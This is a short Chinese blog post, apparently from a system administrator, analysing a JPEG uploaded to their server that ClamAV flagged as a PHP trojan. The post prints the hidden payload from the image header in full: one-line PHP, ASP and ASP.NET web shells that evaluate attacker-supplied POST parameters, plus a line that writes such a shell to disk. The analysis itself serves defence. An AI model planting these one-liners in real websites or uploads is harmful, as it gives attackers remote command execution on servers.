<!DOCTYPE html>
<html lang="zh_cn">
<head>


    <meta name="tags" contents="吐槽" />
    <meta name="tags" contents="安全" />
    <meta name="tags" contents="木马" />
    <meta name="tags" contents="病毒" />

</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="http://eleveni386.7axu.com">Eleven.I386's Blog <strong></strong></a></h1>
        </header><!-- /#banner -->
        <nav id="menu"><ul>
        </ul></nav><!-- /#menu -->
<section id="content" class="body">
  <header>
    <h2 class="entry-title">
      <a href="http://eleveni386.7axu.com/posts/2013/08/11/tu-pian-hou-men-fen-xi/" rel="bookmark"
         title="Permalink to 图片后门分析">图片后门分析</a></h2>
 
  </header>
  <footer class="post-info">
    <abbr class="published" title="2013-08-11T00:00:00">
      日 11 八月 2013
    </abbr>
    <address class="vcard author">
      By <a class="url fn" href="http://eleveni386.7axu.com/author/eleveni386.html">eleven.i386</a>
    </address>
  </footer><!-- /.post-info -->
  <div class="entry-content">
    <p>就在刚才, 我们服务器拦截一个用户上传的图片, 有php.hide类型的木马问题, 
我将图片抓到本地pc上改名为xx, 然后上传到http://www.virscan.org/ 进行多病毒库扫描, 
发现只有clamav报毒, (我本地pc用的也是它) 我先确定这家伙都是不是图片.</p>
<div class="highlight"><pre>    <span class="n">file</span> <span class="n">xx</span><span class="p">.</span><span class="n">png</span>
    <span class="n">xx</span><span class="p">.</span><span class="n">jpg</span><span class="o">:</span> <span class="n">JPEG</span> <span class="o">/</span><span class="n">image</span> <span class="n">data</span><span class="p">,</span> <span class="n">JFIF</span> <span class="n">standard</span> <span class="mf">1.01</span>
</pre></div>


<p>很好,这货还是一张图片, 再看看这个图片隐藏了啥木马,一般人都喜欢往图片的尾巴上插入内容,</p>
<p><code>tail -n 10 xx.png</code></p>
<p><img alt="" src="/image/DeepinScrot-2016-300x70.png" /></p>
<p>好吧,这货看上去很无辜的样子, 但是咱很相信<strong>clamav</strong>的说 :-),  <strong>clamv</strong>既然说
这货不干净,那么就肯定有什么奇怪的东西混进去了, 那就看看图片头部上有啥东西</p>
<p><code>head -n 1 xx.png</code></p>
<p><img alt="" src="/image/DeepinScrot-2239-300x19.png" /></p>
<p>嘿嘿,看见了么, 我们发现了一只奇怪的字符串呢, 在这里 就在这里</p>
<div class="highlight"><pre><span class="x">&lt;?fputs(fopen(&quot;TNT.PHP&quot;,&quot;w&quot;),&quot;&lt;?eval(\$_POST[TNT]);?&gt;&quot;)?&gt;&quot;</span>
<span class="cp">&lt;%</span><span class="n">execute</span><span class="p">(</span><span class="n">request</span><span class="p">(</span><span class="s2">&quot;TNT&quot;</span><span class="p">))</span><span class="cp">%&gt;</span><span class="x">&lt;?php eval($_POST[TNT]);?&gt; </span>
<span class="cp">&lt;%</span> <span class="vi">@Page</span> <span class="no">Language</span><span class="o">=</span><span class="s2">&quot;Jscript&quot;</span><span class="cp">%&gt;&lt;%</span><span class="nb">eval</span><span class="p">(</span><span class="no">Request</span><span class="o">.</span><span class="n">Item</span><span class="o">[</span><span class="s2">&quot;TNT&quot;</span><span class="o">]</span><span class="p">,</span><span class="s2">&quot;unsafe&quot;</span><span class="p">);</span><span class="cp">%&gt;</span><span class="x">�</span>
</pre></div>


<p>到此分析就结束了, 没啥技术含量,但是做这个木马的人 更没有技术含量… </p>
  </div><!-- /.entry-content -->
</section>
        <footer id="contentinfo" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a href="http://getpelican.com/">Pelican</a>,
                which takes great advantage of <a href="http://python.org">Python</a>.
                </address><!-- /#about -->
        </footer><!-- /#contentinfo -->
</body>
</html>